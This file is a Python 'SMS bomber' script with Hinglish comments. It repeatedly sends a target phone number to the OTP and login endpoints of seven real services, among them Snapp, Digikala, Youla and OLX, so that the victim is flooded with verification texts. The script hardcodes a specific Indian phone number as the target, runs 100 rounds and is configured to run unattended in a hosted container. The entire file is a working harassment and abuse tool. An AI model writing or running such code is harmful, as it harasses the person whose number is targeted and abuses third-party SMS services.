import time
import sys
from colorama import Fore, Style, init
import httpx

init(autoreset=True)

# --------- 1. API Functions (Aapka Original Code) ---------
def send_sms_snapp(phone, country, proxy=None):
    try:
        phone_full = f"{country}{phone}"
        url = "https://api.snapp.ir/api/v1/sms/link"
        data = {"phone": phone_full}
        headers = {"User-Agent": "okhttp/3.12.1", "Content-Type": "application/json"}
        with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
            r = client.post(url, json=data, headers=headers)
            print(f"Snapp: {r.status_code}") # Debugging ke liye print add kiya
            return r.status_code == 200 or r.status_code == 201
    except Exception as e:
        print(f"Snapp Error: {e}")
        return False

def send_sms_divar(phone, country, proxy=None):
    try:
        phone_full = f"{country}{phone}"
        url = "https://api.divar.ir/v5/auth/authenticate"
        data = {"phone": phone_full}
        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
        with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
            r = client.post(url, json=data, headers=headers)
            return r.status_code == 200
    except Exception:
        return False

def send_sms_banimode(phone, country, proxy=None):
    try:
        phone_full = f"{country}{phone}"
        url = "https://mobapi.banimode.com/api/v2/auth/request"
        data = {"phone": phone_full}
        headers = {"User-Agent": "okhttp/3.12.1", "Content-Type": "application/json"}
        with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
            r = client.post(url, json=data, headers=headers)
            return r.status_code == 200 or r.status_code == 201
    except Exception:
        return False

def send_sms_alopeyk(phone, country, proxy=None):
    try:
        phone_full = f"{country}{phone}"
        url = "https://sandbox-api.alopeyk.com/api/v2/user/otp"
        data = {"phone": phone_full}
        headers = {"User-Agent": "okhttp/3.12.1", "Content-Type": "application/json"}
        with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
            r = client.post(url, json=data, headers=headers)
            return r.status_code == 200 or r.status_code == 201
    except Exception:
        return False

def send_sms_digikala(phone, country, proxy=None):
    try:
        phone_full = f"0{phone}" if not phone.startswith("0") else phone
        url = "https://api.digikala.com/v1/user/authenticate/"
        data = {"username": phone_full}
        headers = {"User-Agent": "okhttp/3.12.1", "Content-Type": "application/json"}
        with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
            r = client.post(url, json=data, headers=headers)
            return r.status_code == 200
    except Exception:
        return False

def send_sms_youla(phone, country, proxy=None):
    try:
        phone_full = f"+{country}{phone}"
        url = "https://youla.ru/web-api/auth/request_code"
        data = {"phone": phone_full}
        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
        with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
            r = client.post(url, json=data, headers=headers)
            return r.status_code == 200
    except Exception:
        return False

def send_sms_olx(phone, country, proxy=None):
    try:
        phone_full = f"+{country}{phone}"
        url = "https://www.olx.in/api/auth/authenticate"
        data = {"mobile": phone_full}
        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
        with httpx.Client(proxies=proxy, timeout=10) if proxy else httpx.Client(timeout=10) as client:
            r = client.post(url, json=data, headers=headers)
            return r.status_code == 200
    except Exception:
        return False

# List of APIs
SMS_APIS = [
    {"name": "Snapp", "func": send_sms_snapp},
    {"name": "Divar", "func": send_sms_divar},
    {"name": "Banimode", "func": send_sms_banimode},
    {"name": "Alopeyk", "func": send_sms_alopeyk},
    {"name": "Digikala", "func": send_sms_digikala},
    {"name": "Youla", "func": send_sms_youla},
    {"name": "OLX", "func": send_sms_olx}
]

# --------- 2. Automatic Runner (Render Fix) ---------

# ==========================================
# YAHAN APNI DETAILS EDIT KAREIN
# ==========================================
TARGET_COUNTRY = "91"       # Country Code (Bina + ke)
TARGET_PHONE = "9103369975" # Apna Target Number Yahan Likhein
NUMBER_OF_ROUNDS = 100      # Kitni baar loop chalana hai
DELAY_SECONDS = 5           # Speed (Seconds mein)
# ==========================================

def start_automatic_bombing():
    print(f"{Fore.GREEN}[+] Render Mode Started for: {TARGET_COUNTRY}{TARGET_PHONE}{Style.RESET_ALL}")
    
    sent_count = 0
    
    # Infinite loop ya fixed count chala sakte hain
    for i in range(NUMBER_OF_ROUNDS):
        print(f"\n--- Round {i+1} ---")
        
        for api in SMS_APIS:
            try:
                # API ko call karna
                success = api["func"](TARGET_PHONE, TARGET_COUNTRY, None)
                
                if success:
                    print(Fore.GREEN + f"[{api['name']}] SMS Sent Successfully" + Style.RESET_ALL)
                    sent_count += 1
                else:
                    print(Fore.RED + f"[{api['name']}] Failed" + Style.RESET_ALL)
            
            except Exception as e:
                print(Fore.RED + f"[{api['name']}] Error: {e}" + Style.RESET_ALL)
            
            # Thoda wait karein taaki server block na kare
            time.sleep(0.5)
            
        time.sleep(DELAY_SECONDS)

    print(f"{Fore.CYAN}\n[=] Process Completed. Total Sent: {sent_count}{Style.RESET_ALL}")

# --------- 3. Main Execution ---------
if __name__ == "__main__":
    # Yeh function bina kuch pooche seedha start ho jayega
    start_automatic_bombing()
    
    # Render Container ko Zinda rakhne ke liye Sleep
    print("Work done. Sleeping to keep container alive...")
    while True:
        time.sleep(60)
